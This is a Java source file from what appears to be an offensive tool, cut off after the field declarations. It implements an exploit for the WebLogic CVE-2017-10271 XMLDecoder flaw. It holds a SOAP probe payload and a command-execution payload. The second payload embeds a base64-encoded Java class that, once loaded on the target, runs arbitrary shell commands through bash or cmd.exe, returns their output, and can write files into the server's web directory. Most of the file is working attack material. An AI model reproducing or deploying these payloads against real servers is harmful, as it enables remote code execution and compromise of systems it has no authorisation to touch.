package fun.fireline.exp.oracle.weblogic;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Random;

/**
 * @author zq
 * @date 2021/8/21 21:25
 * @github https://github.com/zq0
 *
 * CVE-2017-10271 Weblogic12
 */

public class CVE_2017_10271_12 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String CheckStr = "xml_test_ok";
    private static final String VULURL = "/wls-wsat/CoordinatorPortType";
    private static final String FileAbsPath = "/wls-wsat/";
    private static final String Base64APIClass = "yv66vgAAADIBEgcAAgEAIGNvbS9zdXBlcmVhbS9leHBsb2l0cy9YbWxBUElUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEAAWIBACdMd2VibG9naWMvdXRpbHMvZW5jb2RlcnMvQkFTRTY0RGVjb2RlcjsBAAg8Y2xpbml0PgEAAygpVgEABENvZGUHAAsBACV3ZWJsb2dpYy91dGlscy9lbmNvZGVycy9CQVNFNjREZWNvZGVyCgAKAA0MAA4ACAEABjxpbml0PgkAAQAQDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUKAAMADQEABHRoaXMBACJMY29tL3N1cGVyZWFtL2V4cGxvaXRzL1htbEFQSVRlc3Q7AQAHZ2V0UGF0aAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CgABABkMABoAGwEAGGdldEh0dHBDb25uZWN0aW9uSGFuZGxlcgEAMygpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwoAHQAfBwAeAQAvd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9IdHRwQ29ubmVjdGlvbkhhbmRsZXIMACAAIQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAwKClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVxdWVzdEltcGw7CgAjACUHACQBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAJgAnAQAKZ2V0Q29udGV4dAEAMigpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7BwApAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKACsALQcALAEALndlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQMAC4ALwEADmdldFJvb3RUZW1wRGlyAQAQKClMamF2YS9pby9GaWxlOwoAMQAzBwAyAQAMamF2YS9pby9GaWxlDAA0ABcBAA9nZXRBYnNvbHV0ZVBhdGgKADYAOAcANwEAEGphdmEvbGFuZy9TdHJpbmcMADkAOgEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwoAKAA8DAAOAD0BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIAD8BAAUvd2FyLwoAKABBDABCAEMBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKACgARQwARgAXAQAIdG9TdHJpbmcIAEgBAAAHAEoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAVaHR0cENvbm5lY3Rpb25IYW5kbGVyAQAxTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwEAFHdlYkFwcFNlcnZsZXRDb250ZXh0AQAwTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7AQANU3RhY2tNYXBUYWJsZQoAUQBTBwBSAQAQamF2YS9sYW5nL1RocmVhZAwAVABVAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7BwBXAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkCgBWAFkMAFoAWwEADmdldEN1cnJlbnRXb3JrAQAdKClMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsKAAMAXQwAXgBfAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CABhAQARY29ubmVjdGlvbkhhbmRsZXIKAGMAZQcAZAEAD2phdmEvbGFuZy9DbGFzcwwAZgBnAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAaQBrBwBqAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAGwAbQEADXNldEFjY2Vzc2libGUBAAQoWilWCgBpAG8MAHAAcQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZXhlY3V0ZVRocmVhZAEAHUx3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQ7AQALd29ya0FkYXB0ZXIBABtMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAxiYXNlNjREZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoACgB7DAB8AH0BAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCCAB/AQAFVVRGLTgKADYAgQwADgCCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYHAIQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQYmFzZTY0RGVjb2RlQnl0ZQEAEmdldFNlcnZsZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsKACMAiwwAjACJAQALZ2V0UmVzcG9uc2UBAAhyZXNwb25zZQEAL0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7BwCQAQAtd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsAQAEcGF0aAEACkV4Y2VwdGlvbnMKAAEAlAwAiACJCgCPAJYMAJcAmAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CgABAJoMABYAFwoAnACeBwCdAQATamF2YS9pby9QcmludFdyaXRlcgwAnwA9AQAFcHJpbnQBAAJ1cAgAogEAAToKADYApAwApQCmAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsKAAEAqAwAeAB5CACRCgA2AKsMAKwArQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgoAAQCvDACHAH0KALEAswcAsgEAGHdlYmxvZ2ljL3V0aWxzL0ZpbGVVdGlscwwAtACCAQALd3JpdGVUb0ZpbGUIALYBAAt4bWxfdGVzdF9vawEABWJkYXRhAQAFZGF0YXMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACb3ABAARkYXRhAQACW0IHALkBAANzYXkKADYAwAwAwQAXAQAEdHJpbQoANgDDDADEAMUBAAZsZW5ndGgBAAMoKUkIAMcBAAZ3aG9hbWkIAMkBAAdvcy5uYW1lCgDLAM0HAMwBABBqYXZhL2xhbmcvU3lzdGVtDADOAHkBAAtnZXRQcm9wZXJ0eQoANgDQDADRABcBAAt0b0xvd2VyQ2FzZQgA0wEAA3dpbgoANgDVDADWANcBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgcA2QEAE2phdmEvdXRpbC9BcnJheUxpc3QKANgADQgA3AEACS9iaW4vYmFzaAoA2ADeDADfAK0BAANhZGQIAOEBAAItYwgA4wEAB2NtZC5leGUIAOUBAAIvYwcA5wEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgoA5gDpDAAOAOoBABMoTGphdmEvdXRpbC9MaXN0OylWCgDmAOwMAO0A7gEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwoA5gDwDADxAPIBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAjwD0DAD1APYBABZnZXRTZXJ2bGV0T3V0cHV0U3RyZWFtAQA1KClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0T3V0cHV0U3RyZWFtSW1wbDsKAPgA+gcA+QEAEWphdmEvbGFuZy9Qcm9jZXNzDAD7APwBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07CgD+AQAHAP8BADF3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsDAEBAQIBAAt3cml0ZVN0cmVhbQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgoAnAEEDAEFAAgBAAVmbHVzaAEAA2NtZAEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAOcHJvY2Vzc0J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAKU291cmNlRmlsZQEAD1htbEFQSVRlc3QuamF2YQAhAAEAAwAAAAEACgAFAAYAAAALAAgABwAIAAEACQAAACsAAgAAAAAAC7sAClm3AAyzAA+xAAAAAgARAAAABgABAAAALAASAAAAAgAAAAEADgAIAAEACQAAAC8AAQABAAAABSq3ABOxAAAAAgARAAAABgABAAAADgASAAAADAABAAAABQAUABUAAAACABYAFwABAAkAAACWAAMAAwAAAC8qtwAYTCvGACYrtgActgAiTbsAKFkstgAqtgAwuAA1twA7Ej62AEC2AESwTBJHsAABAAAAKgArAEkAAwARAAAAGgAGAAAAEQAFABIACQATABEAFAArABcALAAaABIAAAAgAAMAAAAvABQAFQAAAAUAJgBLAEwAAQARABoATQBOAAIATwAAAAcAAmsHAEkAAAIAGgAbAAEACQAAAKQAAgAEAAAAK7gAUMAAVkwrtgBYTSy2AFwSYLYAYk4txgASLQS2AGgtLLYAbsAAHbBMAbAAAQAAACcAKABJAAMAEQAAACIACAAAAB8ABwAgAAwAIQAWACIAGgAjAB8AJAAoACYAKQAqABIAAAAqAAQAAAArABQAFQAAAAcAIQByAHMAAQAMABwAdAB1AAIAFgASAHYAdwADAE8AAAAHAAJoBwBJAAACAHgAeQABAAkAAABlAAQAAwAAABW7ADZZsgAPK7YAehJ+twCAsE0SR7AAAQAAABAAEQCDAAMAEQAAAA4AAwAAAC8AEQAwABIAMgASAAAAFgACAAAAFQAUABUAAAAAABUAhQCGAAEATwAAAAYAAVEHAIMAAgCHAH0AAQAJAAAAWwACAAMAAAALsgAPK7YAerBNAbAAAQAAAAcACACDAAMAEQAAAA4AAwAAADYACAA3AAkAOQASAAAAFgACAAAACwAUABUAAAAAAAsAhQCGAAEATwAAAAYAAUgHAIMAAgCIAIkAAQAJAAAAdAABAAMAAAAVAUwqtwAYTSzGAAsstgActgCKTCuwAAAAAwARAAAAFgAFAAAAPQACAD4ABwA/AAsAQAATAEIAEgAAACAAAwAAABUAFAAVAAAAAgATAI0AjgABAAcADgBLAEwAAgBPAAAACwAB/QATBwCPBwAdAAEAkQAIAAIAkgAAAAQAAQBJAAkAAAA9AAIAAQAAAA8qtwCTtgCVKrcAmbYAm7EAAAACABEAAAAKAAIAAABGAA4ARwASAAAADAABAAAADwAUABUAAAABAJ8APQACAJIAAAAEAAEASQAJAAAARAACAAIAAAAMKrcAk7YAlSu2AJuxAAAAAgARAAAACgACAAAASgALAEsAEgAAABYAAgAAAAwAFAAVAAAAAAAMAIUAhgABAAEAoAA9AAIAkgAAAAQAAQBJAAkAAADiAAMABgAAAFIrEqG2AKNNLAMyTiosBDK3AKc6BBKpLbYAqpoAG7sAKFkqtwCZuAA1twA7GQS2AEC2AEQ6BCosBTK3AK46BRkFGQS4ALAqtwCTtgCVErW2AJuxAAAAAwARAAAAJgAJAAAATgAHAFAACwBRABQAUgAdAFQANQBWAD4AVwBFAFgAUQBZABIAAAA+AAYAAABSABQAFQAAAAAAUgC3AIYAAQAHAEsAuAC5AAIACwBHALoAhgADABQAPgCRAIYABAA+ABQAuwC8AAUATwAAAA4AAf4ANQcAvQcANgcANgABAL4APQACAJIAAAAEAAEASQAJAAABhgADAAgAAACmKiu3AKdMK8YADSu2AL+2AMKaAAYSxkwEPRLIuADKTi3GABEttgDPEtK2ANSZAAUDPbsA2Fm3ANo6BByZAB0ZBBLbtgDdVxkEEuC2AN1XGQQrtgDdV6cAGhkEEuK2AN1XGQQS5LYA3VcZBCu2AN1XuwDmWRkEtwDoOgUZBQS2AOtXGQW2AO86Biq3AJM6BxkHtgDzGQa2APe2AP0qtwCTtgCVtgEDsQAAAAMAEQAAAF4AFwAAAF0ABgBeABQAXwAXAGEAGQBiAB8AYwAvAGQAMQBnADoAaAA+AGkARgBqAE4AawBVAGwAWABtAGAAbgBoAG8AbwBxAHoAcgCBAHMAiAB0AI4AdQCbAHYApQB3ABIAAABSAAgAAACmABQAFQAAAAAApgEGAIYAAQAZAI0BBwEIAAIAHwCHAQkAhgADADoAbAEKAQsABAB6ACwBDAENAAUAiAAeAQ4BDwAGAI4AGACNAI4ABwBPAAAAEgAFFAL9ABkBBwA2/AAmBwDYFgABARAAAAACARE=";
    private static String Check_VUL = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java>\n<void class=\"java.lang.Thread\" method=\"currentThread\">\n\t\t\t\t<void method=\"getCurrentWork\" id=\"current_work\">\n\t\t\t\t\t<void method=\"getClass\">\n\t\t\t\t\t\t<void method=\"getDeclaredField\">\n\t\t\t\t\t\t\t<string>connectionHandler</string>\n\t\t\t\t\t\t\t\t<void method=\"setAccessible\"><boolean>true</boolean></void>\n\t\t\t\t\t\t\t<void method=\"get\">\n\t\t\t\t\t\t\t\t<object idref=\"current_work\"></object>\n\t\t\t\t\t\t\t\t<void method=\"getServletRequest\">\n\t\t\t\t\t\t\t\t\t<void method=\"getResponse\">\n\t\t\t\t\t\t\t\t\t\t<void method=\"getServletOutputStream\">\n\t\t\t\t\t\t\t\t\t\t\t<void method=\"flush\"/>\n\t\t\t\t\t\t\t\t\t\t\t</void>\n\t\t\t\t\t\t\t\t\t<void method=\"getWriter\"><void method=\"write\"><string>xml_test_ok</string></void></void>\n\t\t\t\t\t\t\t\t\t</void>\n\t\t\t\t\t\t\t\t</void>\n\t\t\t\t\t\t\t</void>\n\t\t\t\t\t\t</void>\n\t\t\t\t\t</void>\n\t\t\t\t</void>\n\t\t\t</void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";
    private static String VUL_CMD = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n        <java>\n\t\t\t<void class=\"sun.misc.BASE64Decoder\">\n\t\t\t\t<void method=\"decodeBuffer\" id=\"byte_arr\"><string>yv66vgAAADIBEgcAAgEAIGNvbS9zdXBlcmVhbS9leHBsb2l0cy9YbWxBUElUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEAAWIBACdMd2VibG9naWMvdXRpbHMvZW5jb2RlcnMvQkFTRTY0RGVjb2RlcjsBAAg8Y2xpbml0PgEAAygpVgEABENvZGUHAAsBACV3ZWJsb2dpYy91dGlscy9lbmNvZGVycy9CQVNFNjREZWNvZGVyCgAKAA0MAA4ACAEABjxpbml0PgkAAQAQDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUKAAMADQEABHRoaXMBACJMY29tL3N1cGVyZWFtL2V4cGxvaXRzL1htbEFQSVRlc3Q7AQAHZ2V0UGF0aAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CgABABkMABoAGwEAGGdldEh0dHBDb25uZWN0aW9uSGFuZGxlcgEAMygpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwoAHQAfBwAeAQAvd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9IdHRwQ29ubmVjdGlvbkhhbmRsZXIMACAAIQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAwKClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVxdWVzdEltcGw7CgAjACUHACQBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAJgAnAQAKZ2V0Q29udGV4dAEAMigpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7BwApAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKACsALQcALAEALndlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQMAC4ALwEADmdldFJvb3RUZW1wRGlyAQAQKClMamF2YS9pby9GaWxlOwoAMQAzBwAyAQAMamF2YS9pby9GaWxlDAA0ABcBAA9nZXRBYnNvbHV0ZVBhdGgKADYAOAcANwEAEGphdmEvbGFuZy9TdHJpbmcMADkAOgEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwoAKAA8DAAOAD0BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIAD8BAAUvd2FyLwoAKABBDABCAEMBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKACgARQwARgAXAQAIdG9TdHJpbmcIAEgBAAAHAEoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAVaHR0cENvbm5lY3Rpb25IYW5kbGVyAQAxTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvSHR0cENvbm5lY3Rpb25IYW5kbGVyOwEAFHdlYkFwcFNlcnZsZXRDb250ZXh0AQAwTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvV2ViQXBwU2VydmxldENvbnRleHQ7AQANU3RhY2tNYXBUYWJsZQoAUQBTBwBSAQAQamF2YS9sYW5nL1RocmVhZAwAVABVAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7BwBXAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkCgBWAFkMAFoAWwEADmdldEN1cnJlbnRXb3JrAQAdKClMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsKAAMAXQwAXgBfAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CABhAQARY29ubmVjdGlvbkhhbmRsZXIKAGMAZQcAZAEAD2phdmEvbGFuZy9DbGFzcwwAZgBnAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAaQBrBwBqAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAGwAbQEADXNldEFjY2Vzc2libGUBAAQoWilWCgBpAG8MAHAAcQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZXhlY3V0ZVRocmVhZAEAHUx3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQ7AQALd29ya0FkYXB0ZXIBABtMd2VibG9naWMvd29yay9Xb3JrQWRhcHRlcjsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAxiYXNlNjREZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoACgB7DAB8AH0BAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCCAB/AQAFVVRGLTgKADYAgQwADgCCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYHAIQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQYmFzZTY0RGVjb2RlQnl0ZQEAEmdldFNlcnZsZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsKACMAiwwAjACJAQALZ2V0UmVzcG9uc2UBAAhyZXNwb25zZQEAL0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7BwCQAQAtd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsAQAEcGF0aAEACkV4Y2VwdGlvbnMKAAEAlAwAiACJCgCPAJYMAJcAmAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CgABAJoMABYAFwoAnACeBwCdAQATamF2YS9pby9QcmludFdyaXRlcgwAnwA9AQAFcHJpbnQBAAJ1cAgAogEAAToKADYApAwApQCmAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsKAAEAqAwAeAB5CACRCgA2AKsMAKwArQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgoAAQCvDACHAH0KALEAswcAsgEAGHdlYmxvZ2ljL3V0aWxzL0ZpbGVVdGlscwwAtACCAQALd3JpdGVUb0ZpbGUIALYBAAt4bWxfdGVzdF9vawEABWJkYXRhAQAFZGF0YXMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACb3ABAARkYXRhAQACW0IHALkBAANzYXkKADYAwAwAwQAXAQAEdHJpbQoANgDDDADEAMUBAAZsZW5ndGgBAAMoKUkIAMcBAAZ3aG9hbWkIAMkBAAdvcy5uYW1lCgDLAM0HAMwBABBqYXZhL2xhbmcvU3lzdGVtDADOAHkBAAtnZXRQcm9wZXJ0eQoANgDQDADRABcBAAt0b0xvd2VyQ2FzZQgA0wEAA3dpbgoANgDVDADWANcBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgcA2QEAE2phdmEvdXRpbC9BcnJheUxpc3QKANgADQgA3AEACS9iaW4vYmFzaAoA2ADeDADfAK0BAANhZGQIAOEBAAItYwgA4wEAB2NtZC5leGUIAOUBAAIvYwcA5wEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgoA5gDpDAAOAOoBABMoTGphdmEvdXRpbC9MaXN0OylWCgDmAOwMAO0A7gEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwoA5gDwDADxAPIBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAjwD0DAD1APYBABZnZXRTZXJ2bGV0T3V0cHV0U3RyZWFtAQA1KClMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0T3V0cHV0U3RyZWFtSW1wbDsKAPgA+gcA+QEAEWphdmEvbGFuZy9Qcm9jZXNzDAD7APwBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07CgD+AQAHAP8BADF3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsDAEBAQIBAAt3cml0ZVN0cmVhbQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgoAnAEEDAEFAAgBAAVmbHVzaAEAA2NtZAEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAOcHJvY2Vzc0J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAKU291cmNlRmlsZQEAD1htbEFQSVRlc3QuamF2YQAhAAEAAwAAAAEACgAFAAYAAAALAAgABwAIAAEACQAAACsAAgAAAAAAC7sAClm3AAyzAA+xAAAAAgARAAAABgABAAAALAASAAAAAgAAAAEADgAIAAEACQAAAC8AAQABAAAABSq3ABOxAAAAAgARAAAABgABAAAADgASAAAADAABAAAABQAUABUAAAACABYAFwABAAkAAACWAAMAAwAAAC8qtwAYTCvGACYrtgActgAiTbsAKFkstgAqtgAwuAA1twA7Ej62AEC2AESwTBJHsAABAAAAKgArAEkAAwARAAAAGgAGAAAAEQAFABIACQATABEAFAArABcALAAaABIAAAAgAAMAAAAvABQAFQAAAAUAJgBLAEwAAQARABoATQBOAAIATwAAAAcAAmsHAEkAAAIAGgAbAAEACQAAAKQAAgAEAAAAK7gAUMAAVkwrtgBYTSy2AFwSYLYAYk4txgASLQS2AGgtLLYAbsAAHbBMAbAAAQAAACcAKABJAAMAEQAAACIACAAAAB8ABwAgAAwAIQAWACIAGgAjAB8AJAAoACYAKQAqABIAAAAqAAQAAAArABQAFQAAAAcAIQByAHMAAQAMABwAdAB1AAIAFgASAHYAdwADAE8AAAAHAAJoBwBJAAACAHgAeQABAAkAAABlAAQAAwAAABW7ADZZsgAPK7YAehJ+twCAsE0SR7AAAQAAABAAEQCDAAMAEQAAAA4AAwAAAC8AEQAwABIAMgASAAAAFgACAAAAFQAUABUAAAAAABUAhQCGAAEATwAAAAYAAVEHAIMAAgCHAH0AAQAJAAAAWwACAAMAAAALsgAPK7YAerBNAbAAAQAAAAcACACDAAMAEQAAAA4AAwAAADYACAA3AAkAOQASAAAAFgACAAAACwAUABUAAAAAAAsAhQCGAAEATwAAAAYAAUgHAIMAAgCIAIkAAQAJAAAAdAABAAMAAAAVAUwqtwAYTSzGAAsstgActgCKTCuwAAAAAwARAAAAFgAFAAAAPQACAD4ABwA/AAsAQAATAEIAEgAAACAAAwAAABUAFAAVAAAAAgATAI0AjgABAAcADgBLAEwAAgBPAAAACwAB/QATBwCPBwAdAAEAkQAIAAIAkgAAAAQAAQBJAAkAAAA9AAIAAQAAAA8qtwCTtgCVKrcAmbYAm7EAAAACABEAAAAKAAIAAABGAA4ARwASAAAADAABAAAADwAUABUAAAABAJ8APQACAJIAAAAEAAEASQAJAAAARAACAAIAAAAMKrcAk7YAlSu2AJuxAAAAAgARAAAACgACAAAASgALAEsAEgAAABYAAgAAAAwAFAAVAAAAAAAMAIUAhgABAAEAoAA9AAIAkgAAAAQAAQBJAAkAAADiAAMABgAAAFIrEqG2AKNNLAMyTiosBDK3AKc6BBKpLbYAqpoAG7sAKFkqtwCZuAA1twA7GQS2AEC2AEQ6BCosBTK3AK46BRkFGQS4ALAqtwCTtgCVErW2AJuxAAAAAwARAAAAJgAJAAAATgAHAFAACwBRABQAUgAdAFQANQBWAD4AVwBFAFgAUQBZABIAAAA+AAYAAABSABQAFQAAAAAAUgC3AIYAAQAHAEsAuAC5AAIACwBHALoAhgADABQAPgCRAIYABAA+ABQAuwC8AAUATwAAAA4AAf4ANQcAvQcANgcANgABAL4APQACAJIAAAAEAAEASQAJAAABhgADAAgAAACmKiu3AKdMK8YADSu2AL+2AMKaAAYSxkwEPRLIuADKTi3GABEttgDPEtK2ANSZAAUDPbsA2Fm3ANo6BByZAB0ZBBLbtgDdVxkEEuC2AN1XGQQrtgDdV6cAGhkEEuK2AN1XGQQS5LYA3VcZBCu2AN1XuwDmWRkEtwDoOgUZBQS2AOtXGQW2AO86Biq3AJM6BxkHtgDzGQa2APe2AP0qtwCTtgCVtgEDsQAAAAMAEQAAAF4AFwAAAF0ABgBeABQAXwAXAGEAGQBiAB8AYwAvAGQAMQBnADoAaAA+AGkARgBqAE4AawBVAGwAWABtAGAAbgBoAG8AbwBxAHoAcgCBAHMAiAB0AI4AdQCbAHYApQB3ABIAAABSAAgAAACmABQAFQAAAAAApgEGAIYAAQAZAI0BBwEIAAIAHwCHAQkAhgADADoAbAEKAQsABAB6ACwBDAENAAUAiAAeAQ4BDwAGAI4AGACNAI4ABwBPAAAAEgAFFAL9ABkBBwA2/AAmBwDYFgABARAAAAACARE=</string>\n\t\t\t\t</void>\n\t\t\t</void>\n\t\t\t<void class=\"org.mozilla.classfile.DefiningClassLoader\">\n\t\t\t\t<void method=\"defineClass\">\n\t\t\t\t\t<string>com.supeream.exploits.XmlAPITest</string>\n\t\t\t\t\t<object idref=\"byte_arr\"></object>\n\t\t\t\t\t<void method=\"newInstance\">\n\t\t\t\t\t\t<void method=\"say\" id=\"result\">\n\t\t\t\t\t\t\t<string>%s</string>\n\t\t\t\t\t\t</void>\n\t\t\t\t\t</void>\n\t\t\t\t</void>\n\t\t\t</void>\n\t\t</java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";
    private static Random rand = new Random();
